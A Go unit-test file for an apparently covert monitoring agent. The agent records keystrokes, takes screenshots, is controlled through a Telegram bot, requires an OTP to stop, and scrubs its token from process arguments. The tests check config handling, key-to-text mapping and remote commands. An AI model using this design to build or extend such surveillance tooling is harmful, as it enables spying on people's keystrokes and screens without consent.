package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

func setupTemp(t *testing.T) {
	t.Helper()
	dir := t.TempDir()
	baseDir = dir
	configPath = filepath.Join(dir, "config.json")
	logPath = filepath.Join(dir, "monitor.log")
}

func drainQueue() []sendItem {
	var items []sendItem
	for {
		it, ok := sendQ.tryPop()
		if !ok {
			return items
		}
		items = append(items, it)
	}
}

func TestParseBool(t *testing.T) {
	for _, s := range []string{"1", "on", "true", "YES", "bật", "bat", "có"} {
		if !parseBool(s) {
			t.Errorf("parseBool(%q) should be true", s)
		}
	}
	for _, s := range []string{"0", "off", "false", "khong", "", "no"} {
		if parseBool(s) {
			t.Errorf("parseBool(%q) should be false", s)
		}
	}
}

func TestIsDigits(t *testing.T) {
	if !isDigits("123") || isDigits("12a") || isDigits("") {
		t.Error("isDigits wrong")
	}
}

func TestVkToText(t *testing.T) {
	cases := []struct {
		vk    int
		shift bool
		want  string
	}{
		{0x41, false, "a"}, {0x41, true, "A"},
		{0x0D, false, "[ENTER]"}, {0x31, true, "!"},
		{0x31, false, "1"}, {0x20, false, " "},
	}
	for _, c := range cases {
		if got := vkToText(c.vk, c.shift); got != c.want {
			t.Errorf("vkToText(%#x,%v)=%q want %q", c.vk, c.shift, got, c.want)
		}
	}
}

func TestGenOtp(t *testing.T) {
	for i := 0; i < 100; i++ {
		code := genOtp()
		if len(code) != 6 {
			t.Fatalf("otp len=%d (%q)", len(code), code)
		}
		if !isDigits(code) {
			t.Fatalf("otp not digits: %q", code)
		}
	}
}

func TestConfigValidateClamp(t *testing.T) {
	c := defaultConfig()
	c.ScreenshotInterval = 1
	c.KeylogFlush = 1
	c.BlockSafetyMinutes = -5
	c.HeartbeatInterval = 10
	c.Validate()
	if c.ScreenshotInterval != 5 {
		t.Errorf("screenshot interval not clamped: %d", c.ScreenshotInterval)
	}
	if c.KeylogFlush != 10 {
		t.Errorf("keylog flush not clamped: %d", c.KeylogFlush)
	}
	if c.BlockSafetyMinutes != 0 {
		t.Errorf("block minutes not clamped: %d", c.BlockSafetyMinutes)
	}
	if c.HeartbeatInterval != 60 {
		t.Errorf("heartbeat not clamped: %d", c.HeartbeatInterval)
	}
}

func TestApplyConfigDataMerge(t *testing.T) {
	base := defaultConfig()
	base.BotToken = "KEEP"
	// JSON chỉ có 1 trường -> các trường khác giữ nguyên base
	data, _ := json.Marshal(map[string]interface{}{"screenshot_interval": 120})
	c, ok := applyConfigData(base, data)
	if !ok {
		t.Fatal("applyConfigData failed")
	}
	if c.BotToken != "KEEP" {
		t.Error("merge should keep base token")
	}
	if c.ScreenshotInterval != 120 {
		t.Error("merge should apply new interval")
	}
}

func TestConfigRoundtrip(t *testing.T) {
	setupTemp(t)
	cfg = defaultConfig()
	cfgUpdate(func(c *Config) {
		c.ScreenshotInterval = 90
		c.BotToken = "123:ABC"
		c.ChatID = "999"
	})
	cfg = defaultConfig()
	loadConfig()
	if cfgGet().ScreenshotInterval != 90 || cfgGet().BotToken != "123:ABC" || cfgGet().ChatID != "999" {
		t.Fatalf("config roundtrip failed: %+v", cfgGet())
	}
}

func TestApplySetValidation(t *testing.T) {
	setupTemp(t)
	cfg = defaultConfig()
	if e := applySet("screenshot_interval", "42"); e != "" || cfgGet().ScreenshotInterval != 42 {
		t.Fatal("set interval failed")
	}
	if e := applySet("keylogger", "on"); e != "" || !cfgGet().Keylogger {
		t.Fatal("set keylogger failed")
	}
	if e := applySet("screenshot_interval", "abc"); e == "" {
		t.Fatal("non-numeric should error")
	}
	if e := applySet("bad_key", "x"); e == "" {
		t.Fatal("bad key should error")
	}
	// negative gets clamped by Validate
	applySet("screenshot_interval", "-99")
	if cfgGet().ScreenshotInterval != 5 {
		t.Fatalf("negative should clamp to 5, got %d", cfgGet().ScreenshotInterval)
	}
}

func TestGetConfigValue(t *testing.T) {
	setupTemp(t)
	cfg = defaultConfig()
	cfgUpdate(func(c *Config) { c.ScreenshotInterval = 77 })
	if v, ok := getConfigValue("screenshot_interval"); !ok || v != "77" {
		t.Fatalf("get config value wrong: %q %v", v, ok)
	}
	if _, ok := getConfigValue("bot_token"); !ok {
		t.Fatal("bot_token should be readable (masked)")
	}
	if _, ok := getConfigValue("nope"); ok {
		t.Fatal("bad key should fail")
	}
}

func TestCommands(t *testing.T) {
	setupTemp(t)
	cfg = defaultConfig()
	cfgUpdate(func(c *Config) { c.ChatID = "123" })
	drainQueue()

	handleCommand("/interval 60", "123")
	if cfgGet().ScreenshotInterval != 60 {
		t.Fatal("interval cmd failed")
	}
	handleCommand("/screen off", "123")
	if cfgGet().ScreenshotsEnabled {
		t.Fatal("screen off failed")
	}
	handleCommand("/set keylogger on", "123")
	if !cfgGet().Keylogger {
		t.Fatal("set keylog failed")
	}
	items := drainQueue()
	if len(items) == 0 {
		t.Fatal("expected reply messages queued")
	}
}

func TestOtpFlow(t *testing.T) {
	setupTemp(t)
	cfg = defaultConfig()
	cfgUpdate(func(c *Config) { c.ChatID = "123" })
	pending = map[string]pendingOtp{}
	otpFailures = 0
	drainQueue()

	requestOtp("stop", "TEST")
	if _, ok := pending["stop"]; !ok {
		t.Fatal("otp not created")
	}

	handleCommand("/confirm 000000x", "123")
	if _, ok := pending["stop"]; !ok {
		t.Fatal("wrong code should keep pending")
	}
	if otpFailures != 1 {
		t.Fatalf("expected 1 failure, got %d", otpFailures)
	}

	// 5 sai -> huy tat ca
	for i := 0; i < 4; i++ {
		handleCommand("/confirm 999999z", "123")
	}
	if _, ok := pending["stop"]; ok {
		t.Fatal("after 5 failures pending should clear")
	}

	// correct path
	requestOtp("shutdown", "X")
	code2 := pending["shutdown"].code
	handleCommand("/confirm "+code2, "123")
	if _, ok := pending["shutdown"]; ok {
		t.Fatal("confirm should consume otp")
	}
}

func TestQueueDropOldest(t *testing.T) {
	setupTemp(t)
	cfg = defaultConfig()
	cfgUpdate(func(c *Config) { c.ChatID = "123" })
	// thay queue nhỏ để test
	old := sendQ
	sendQ = newSendQueue(3)
	defer func() { sendQ = old }()
	for i := 0; i < 10; i++ {
		notify("msg")
	}
	if sendQ.len() != 3 {
		t.Fatalf("queue should cap at 3, got %d", sendQ.len())
	}
}

func TestMaskToken(t *testing.T) {
	if maskToken("123456789:ABC") == "123456789:ABC" {
		t.Fatal("token should be masked")
	}
}

func TestScrubArgs(t *testing.T) {
	saved := os.Args
	defer func() { os.Args = saved }()
	os.Args = []string{"app", "--token", "123:SECRET", "--chat", "1"}
	scrubArgs()
	if os.Args[2] != "***" {
		t.Fatalf("token not scrubbed: %v", os.Args)
	}
	if os.Args[4] != "1" {
		t.Fatal("chat should remain")
	}
}
